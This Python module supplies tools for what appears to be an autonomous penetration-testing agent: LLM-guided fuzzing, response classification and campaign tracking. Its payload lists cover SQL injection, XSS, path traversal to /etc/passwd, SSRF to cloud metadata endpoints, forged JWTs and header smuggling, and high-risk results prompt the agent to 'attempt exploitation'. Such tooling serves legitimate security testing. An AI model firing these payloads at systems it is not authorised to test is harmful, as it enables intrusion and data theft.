"""LLM-powered smart fuzzing — semantically-aware input generation.

Unlike template-based fuzzers, smart fuzzing uses the LLM's understanding
of protocol/API semantics to generate inputs that are:

1. **Syntactically valid enough** to pass parsers and reach deep code paths
2. **Semantically boundary-pushing** — edge cases, type confusion, overflow
3. **Protocol-aware** — understands HTTP, GraphQL, JSON-RPC, WebSocket
4. **Mutation-guided** — successful probes are mutated toward deeper paths

This module provides tools the agent calls to generate and track smart
fuzz campaigns. The LLM generates the payloads; these tools structure
the campaign, classify responses, and track coverage.

Inspired by ChatAFL (NDSS 2024) which found 9 zero-days in protocol
implementations using LLM-guided fuzzing.
"""

from __future__ import annotations

import json
import time
from pathlib import Path

from langchain_core.tools import tool

from buggy.tools.research._state import _json
from buggy_core.utils.logging import get_logger

log = get_logger("research.smart_fuzzer")

# Known interesting boundary values by data type
_BOUNDARY_VALUES: dict[str, list[str]] = {
    "integer": [
        "0",
        "-1",
        "1",
        "2147483647",
        "-2147483648",
        "4294967295",
        "9999999999999999999",
        "NaN",
        "Infinity",
        "-Infinity",
        "0x7FFFFFFF",
        "0xFFFFFFFF",
        "0.1",
        "1e308",
    ],
    "string": [
        "",
        " ",
        "null",
        "undefined",
        "true",
        "false",
        "NaN",
        "A" * 256,
        "A" * 10000,
        "{{7*7}}",
        "${7*7}",
        "a]b",
        "a}b",
        "a>b",
        "<!--",
        "%00",
        "%0a%0d",
        "\x00",
        "\r\n",
        "\n",
        "\\",
        "'",
        '"',
        "<script>alert(1)</script>",
        "' OR 1=1--",
        "'; DROP TABLE users;--",
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "file:///etc/passwd",
        "gopher://localhost:25/",
    ],
    "email": [
        "test@test",
        "a@a.a",
        "@missing-local",
        "local@",
        "test@[127.0.0.1]",
        '"test"@example.com',
        "test+tag@example.com",
        "test%00@example.com",
        "a" * 64 + "@example.com",
    ],
    "url": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "//evil.com",
        "https://evil.com@good.com",
        "http://127.0.0.1",
        "http://0x7f000001",
        "http://[::1]",
        "http://localhost:22",
        "http://169.254.169.254/latest/meta-data/",
        "dict://localhost:6379/info",
    ],
    "json": [
        "{}",
        "[]",
        "null",
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        "[" * 50 + "]" * 50,
        '{"a":' * 50 + "1" + "}" * 50,
    ],
    "graphql": [
        '{"query":"{__schema{types{name}}}"}',
        '{"query":"{__type(name:\\"User\\"){fields{name}}}"}',
        '{"query":"query{' + "a{b{c{d{e{f{g{h{i{j" + "}}" * 10 + '}"}',
        '{"query":"mutation{createUser(input:{role:\\"admin\\"}){id}}"}',
    ],
}


@tool
def generate_smart_payloads(
    target_type: str,
    context: str = "",
    count: int = 20,
) -> str:
    """Generate semantically-aware fuzz payloads for a target type.

    Returns boundary values, type confusion inputs, and protocol-aware
    payloads tailored to the target type. Use these as a starting
    corpus for targeted fuzzing campaigns.

    Args:
        target_type: The data type or protocol to fuzz — ``integer``,
            ``string``, ``email``, ``url``, ``json``, ``graphql``,
            ``header``, ``cookie``, ``path``.
        context: Optional context about the target (e.g. "user ID
            parameter in REST API", "GraphQL mutation for user creation").
        count: Maximum number of payloads to generate.
    """
    payloads = list(_BOUNDARY_VALUES.get(target_type, _BOUNDARY_VALUES["string"]))

    if target_type == "header":
        payloads = [
            "X-Forwarded-For: 127.0.0.1",
            "X-Real-IP: 127.0.0.1",
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-Custom-IP-Authorization: 127.0.0.1",
            "X-Forwarded-Host: evil.com",
            "Host: evil.com",
            "Transfer-Encoding: chunked",
            "Content-Length: 0\r\nContent-Length: 99",
            "X-HTTP-Method-Override: PUT",
        ]
    elif target_type == "cookie":
        payloads = [
            "session=; path=/; domain=.evil.com",
            "admin=true",
            "role=admin",
            "debug=1",
            "user=%00admin",
            "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
            "session=" + "A" * 4096,
        ]
    elif target_type == "path":
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "/./../../etc/passwd",
            "....\\\\....\\\\etc\\\\passwd",
            "/etc/passwd%00.png",
            "..;/admin",
        ]

    return _json(
        {
            "target_type": target_type,
            "context": context,
            "payloads": payloads[:count],
            "payload_count": min(len(payloads), count),
            "note": "Use these as a starting corpus. Mutate successful probes for deeper coverage.",
        }
    )


@tool
def classify_fuzz_response(
    status_code: int,
    response_body: str,
    response_time_ms: float = 0,
    baseline_time_ms: float = 0,
    payload: str = "",
) -> str:
    """Classify a fuzz response to determine if it indicates a vulnerability.

    Analyzes HTTP response code, body content, and timing to classify
    the response as normal, interesting, or potentially vulnerable.

    Args:
        status_code: HTTP response status code.
        response_body: Response body text (first 2000 chars).
        response_time_ms: Response time in milliseconds.
        baseline_time_ms: Normal response time for comparison.
        payload: The payload that produced this response.
    """
    signals: list[dict[str, str]] = []
    risk = "none"

    if status_code == 500:
        signals.append(
            {
                "type": "server_error",
                "detail": "500 Internal Server Error — potential crash/exception",
            }
        )
        risk = "medium"
    elif status_code in (502, 503):
        signals.append(
            {"type": "service_disruption", "detail": f"{status_code} — potential DoS or crash"}
        )
        risk = "high"

    body_lower = response_body.lower()

    error_patterns = [
        ("sql", "SQL error / database exception — potential SQL injection"),
        ("syntax error", "Syntax error — potential injection"),
        ("stack trace", "Stack trace leaked — information disclosure"),
        ("exception", "Unhandled exception — potential crash"),
        ("traceback", "Python traceback — information disclosure"),
        ("fatal error", "Fatal error — potential crash"),
        ("segmentation fault", "Segfault — memory corruption"),
        ("core dumped", "Core dump — memory corruption"),
        ("access denied", "Access control error — potential bypass"),
        ("undefined", "Undefined reference — type confusion"),
    ]

    for pattern, detail in error_patterns:
        if pattern in body_lower:
            signals.append({"type": "error_pattern", "detail": detail, "pattern": pattern})
            if risk == "none":
                risk = "low"
            if pattern in ("sql", "segmentation fault", "core dumped"):
                risk = "high"

    if payload and response_body and payload in response_body:
        signals.append(
            {
                "type": "reflection",
                "detail": "Input reflected in response — potential XSS/injection",
            }
        )
        if risk in ("none", "low"):
            risk = "medium"

    if baseline_time_ms > 0 and response_time_ms > baseline_time_ms * 3:
        signals.append(
            {
                "type": "timing_anomaly",
                "detail": f"Response {response_time_ms:.0f}ms vs baseline {baseline_time_ms:.0f}ms — potential blind injection",
            }
        )
        if risk in ("none", "low"):
            risk = "medium"

    if len(response_body) > 10000 and status_code == 200:
        signals.append(
            {"type": "large_response", "detail": "Unusually large response — potential data leak"}
        )

    return _json(
        {
            "risk": risk,
            "signals": signals,
            "status_code": status_code,
            "response_length": len(response_body),
            "response_time_ms": response_time_ms,
            "payload": payload[:200],
            "action": _action_for_risk(risk),
        }
    )


def _action_for_risk(risk: str) -> str:
    if risk == "high":
        return "INVESTIGATE — likely vulnerability. Create finding and attempt exploitation."
    if risk == "medium":
        return "PROBE DEEPER — mutate payload and re-test with variations."
    if risk == "low":
        return "NOTE — minor signal. Continue fuzzing but record for correlation."
    return "CONTINUE — normal response, try next payload."


@tool
def track_fuzz_campaign(
    campaign_name: str,
    target_endpoint: str,
    payloads_sent: int,
    interesting_count: int,
    findings_json: str = "[]",
    workspace: str = "/workspace",
) -> str:
    """Record a fuzzing campaign's progress and results.

    Args:
        campaign_name: Name for this campaign (e.g. "sqli-search-param").
        target_endpoint: The endpoint being fuzzed.
        payloads_sent: Total payloads sent so far.
        interesting_count: Number of interesting responses.
        findings_json: JSON array of interesting findings from classify_fuzz_response.
        workspace: Engagement workspace path.
    """
    try:
        findings = json.loads(findings_json)
    except json.JSONDecodeError:
        findings = []

    campaign_dir = Path(workspace) / "fuzzing"
    campaign_dir.mkdir(parents=True, exist_ok=True)

    campaign = {
        "name": campaign_name,
        "target_endpoint": target_endpoint,
        "payloads_sent": payloads_sent,
        "interesting_count": interesting_count,
        "findings": findings,
        "updated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }

    campaign_path = campaign_dir / f"{campaign_name}.json"
    campaign_path.write_text(json.dumps(campaign, indent=2), encoding="utf-8")

    return _json(
        {
            "campaign": campaign_name,
            "payloads_sent": payloads_sent,
            "interesting_rate": f"{interesting_count / max(payloads_sent, 1) * 100:.1f}%",
            "campaign_path": str(campaign_path),
        }
    )


SMART_FUZZER_TOOLS = [
    generate_smart_payloads,
    classify_fuzz_response,
    track_fuzz_campaign,
]
